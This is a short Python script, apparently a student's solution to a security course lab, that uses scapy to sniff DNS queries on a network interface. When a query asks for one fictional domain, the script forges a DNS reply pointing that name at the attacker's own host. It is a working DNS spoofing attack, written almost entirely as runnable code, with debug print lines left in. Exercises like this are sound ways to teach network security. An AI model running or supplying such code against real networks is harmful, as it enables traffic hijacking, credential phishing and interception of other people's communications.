#!/var/lib/python/python-q4

from scapy.config import Conf
Conf.ipv6_enabled = False
from scapy.all import *
import prctl

def handle_packet(pkt):
    #print pkt.show
    #print("LMAO")
    server_addr = get_if_addr("eth0")

    print("LOL")
    if pkt.haslayer(DNSQR):
        print(pkt.haslayer(DNSQR))
        print("WIAGJSGGSGFF")
        print(pkt[DNSQR].qname)
    if pkt.haslayer(DNSQR) and pkt.haslayer(UDP) and pkt[DNSQR].qname == 'email.gov-of-caltopia.info.':
        print("TRASH")
        ip = IP(src=pkt[IP].dst, dst=pkt[IP].src)
        udp = UDP(sport=pkt[UDP].dport, dport=pkt[UDP].sport)
        dns = DNS(id=pkt[DNS].id, opcode='QUERY', rcode='ok', qd=DNSQR(qname=pkt[DNSQR].qname), an= DNSRR(rrname=pkt[DNSQR].qname, rdata=server_addr))
        msg = ip / udp / dns
        print(msg)
        send(msg)

    # If you wanted to send a packet back out, it might look something like...
    # ip = IP(...)
    # tcp = TCP(...)
    # app = ...
    # msg = ip / tcp / app
    # send(msg)


if not (prctl.cap_effective.net_admin and prctl.cap_effective.net_raw):
    print "ERROR: I must be invoked via `./pcap_tool.py`, not via `python pcap_tool.py`!"
    exit(1)


sniff(prn=handle_packet, filter='ip', iface='eth0')